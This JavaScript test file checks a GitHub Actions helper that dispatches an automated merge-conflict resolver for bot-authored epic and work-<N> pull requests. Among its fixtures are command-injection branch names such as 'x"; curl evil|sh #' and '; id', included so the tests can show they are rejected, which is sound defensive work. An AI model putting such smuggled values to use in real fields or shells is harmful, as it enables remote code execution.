import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { mergeableState, startConflictResolver, resolverReply, replyIfConflicting } from './epic-conflict-resolver.mjs'

const pr = { user: { login: 'nuxt-harness[bot]' }, head: { sha: 'abc', ref: 'epic/12-x' } }
function fake({ comments = [], fail = false } = {}) {
  const calls = { comments: [], dispatch: [] }
  return { calls, github: {
    paginate: async () => comments,
    rest: {
      issues: { listComments: {}, createComment: async a => { calls.comments.push(a.body); return { data: { id: 99 } } } },
      actions: { createWorkflowDispatch: async a => { if (fail) throw new Error('boom'); calls.dispatch.push(a.inputs) } },
    } } }
}
const guard = async (_d, fn) => fn()
const go = (f, state = 'dirty', now = Date.now()) => startConflictResolver({ github: f.github, owner: 'o', repo: 'r', pull_number: 5, pr: f.pr || pr, state, handoffGuard: guard, now })

test('dirty + no marker → marker comment + dispatch', async () => {
  const f = fake(); const r = await go(f)
  assert.equal(r.status, 'started')
  assert.match(f.calls.comments[0], /epic-conflict-resolve:abc/)
  assert.deepEqual(f.calls.dispatch, [{ issue: '12', feedback: '99', branch: 'epic/12-x' }])
})
test('dirty + marker for this head → no second dispatch', async () => {
  const f = fake({ comments: [{ body: '<!-- epic-conflict-resolve:abc -->', created_at: '2020-01-01T00:00:00Z' }] })
  assert.equal((await go(f)).status, 'already'); assert.equal(f.calls.dispatch.length, 0)
})
test('dirty + resolver note under 30 min old → no dispatch', async () => {
  const now = Date.parse('2026-01-01T01:00:00Z')
  const f = fake({ comments: [{ body: '<!-- epic-conflict-resolve:old -->', created_at: '2026-01-01T00:40:00Z' }] })
  assert.equal((await go(f, 'dirty', now)).status, 'recent'); assert.equal(f.calls.dispatch.length, 0)
})
test('clean / blocked → today’s behaviour (nothing started)', async () => {
  for (const s of ['clean', 'blocked']) { const f = fake(); assert.equal((await go(f, s)).status, 'not-dirty'); assert.equal(f.calls.dispatch.length, 0) }
})
test('dispatch error → error status, reply never says "merges when the checks finish"', async () => {
  const r = await go(fake({ fail: true }))
  assert.equal(r.status, 'error')
  assert.doesNotMatch(resolverReply(r, 'epic/12-x'), /when the checks finish/)
})
test('unknown then dirty → retried, then dispatch', async () => {
  const seq = ['unknown', 'unknown', 'dirty']; let i = 0
  const github = { rest: { pulls: { get: async () => ({ data: { state: 'open', mergeable_state: seq[i++] } }) } } }
  const { state } = await mergeableState({ github, owner: 'o', repo: 'r', pull_number: 5, sleep: async () => {} })
  assert.equal(state, 'dirty'); assert.equal(i, 3)
  const f = fake(); assert.equal((await go(f, state)).status, 'started')
})
test('replyIfConflicting: unknown then dirty → resolver once, "merging main in first" reply', async () => {
  const seq = ['unknown', 'dirty']; let i = 0
  const f = fake()
  f.github.rest.pulls = { get: async () => ({ data: { state: 'open', merged: false, mergeable_state: seq[i++], head: pr.head, user: pr.user } }) }
  const said = []
  const done = await replyIfConflicting({ github: f.github, owner: 'o', repo: 'r', pull_number: 5, handoffGuard: guard, say: async m => said.push(m), sleep: async () => {} })
  assert.equal(done, true)
  assert.equal(f.calls.dispatch.length, 1)
  assert.equal(said.length, 1)
  assert.match(said[0], /merging `main` in first/)
  assert.doesNotMatch(said[0], /when the checks finish/)
})
test('both workflows call the shared helper (real YAML)', () => {
  for (const [file, job] of [['automerge-epic-subpr.yml', 'startConflictResolver'], ['on-comment.yml', 'replyIfConflicting']]) {
    const y = readFileSync(new URL(`../../.github/workflows/${file}`, import.meta.url), 'utf8')
    assert.ok(y.includes('scripts/lib/epic-conflict-resolver.mjs') && y.includes(job), file)
  }
  const oc = readFileSync(new URL('../../.github/workflows/on-comment.yml', import.meta.url), 'utf8')
  assert.ok(oc.indexOf("replyIfConflicting") < oc.indexOf('Approved — merges when the checks finish'))
})
test('non-bot PR author → resolver not started, reply says why', async () => {
  const f = fake(); f.pr = { ...pr, user: { login: 'rando' } }
  const r = await go(f)
  assert.equal(r.status, 'not-pipeline'); assert.equal(f.calls.dispatch.length, 0); assert.equal(f.calls.comments.length, 0)
  assert.match(resolverReply(r, 'epic/12-x'), /not a pipeline PR — resolve the conflict by hand/)
})
test('bot PR whose branch is not epic/… → not started (also via replyIfConflicting)', async () => {
  for (const ref of ['work-5', 'x"; curl evil|sh #', 'epic/12-x"; id']) {
    const f = fake(); f.pr = { ...pr, head: { sha: 'abc', ref } }
    assert.equal((await go(f)).status, 'not-pipeline'); assert.equal(f.calls.dispatch.length, 0)
  }
  const f = fake(); const bad = { ...pr, head: { sha: 'abc', ref: 'feature/x' } }
  f.github.rest.pulls = { get: async () => ({ data: { state: 'open', merged: false, mergeable_state: 'dirty', head: bad.head, user: bad.user } }) }
  const said = []
  await replyIfConflicting({ github: f.github, owner: 'o', repo: 'r', pull_number: 5, handoffGuard: guard, say: async m => said.push(m), sleep: async () => {} })
  assert.equal(f.calls.dispatch.length, 0); assert.match(said[0], /resolve the conflict by hand/)
})

// #4260: a single-ticket pipeline PR straight into main gets the same fixer.
const leaf = { user: { login: 'nuxt-harness[bot]' }, head: { sha: 'abc', ref: 'work-5' }, base: { ref: 'main' } }
test('bot PR work-<N> → main, dirty → note + dispatch on the normal revise path (no branch input)', async () => {
  const f = fake(); f.pr = leaf
  const r = await go(f)
  assert.equal(r.status, 'started')
  assert.match(f.calls.comments[0], /epic-conflict-resolve:abc/)
  assert.match(f.calls.comments[0], /merging `main` into `work-5`/)
  assert.deepEqual(f.calls.dispatch, [{ issue: '5', feedback: '99' }])
})
test('work-<N> PR: only into main, only an exact work-<digits> name, only from the bot', async () => {
  const not = async (p) => { const f = fake(); f.pr = p; assert.equal((await go(f)).status, 'not-pipeline', JSON.stringify(p.head)); assert.equal(f.calls.dispatch.length, 0) }
  await not({ ...leaf, base: { ref: 'epic/12-x' } })
  await not({ ...leaf, base: undefined })
  for (const ref of ['work-5; id', 'work-', 'work-5-x', 'xwork-5', 'work-5\nx']) await not({ ...leaf, head: { sha: 'abc', ref } })
  await not({ ...leaf, user: { login: 'rando' } })
})
test('work-<N> PR: same once-per-head and 30-minute guards as an epic PR', async () => {
  const now = Date.now()
  const same = fake({ comments: [{ body: '<!-- epic-conflict-resolve:abc -->', created_at: new Date(now - 3 * 3600e3).toISOString() }] }); same.pr = leaf
  assert.equal((await go(same, 'dirty', now)).status, 'already')
  const recent = fake({ comments: [{ body: '<!-- epic-conflict-resolve:old -->', created_at: new Date(now - 60e3).toISOString() }] }); recent.pr = leaf
  assert.equal((await go(recent, 'dirty', now)).status, 'recent')
  const clean = fake(); clean.pr = leaf
  assert.equal((await go(clean, 'clean')).status, 'not-dirty')
})
test('the sweep starts the fixer for a work-<N> → main PR too (real YAML)', () => {
  const y = readFileSync(new URL('../../.github/workflows/automerge-epic-subpr.yml', import.meta.url), 'utf8')
  assert.match(y, /if \(\(epicToMain \|\| leafToMain\) && state === 'dirty'\)/)
})
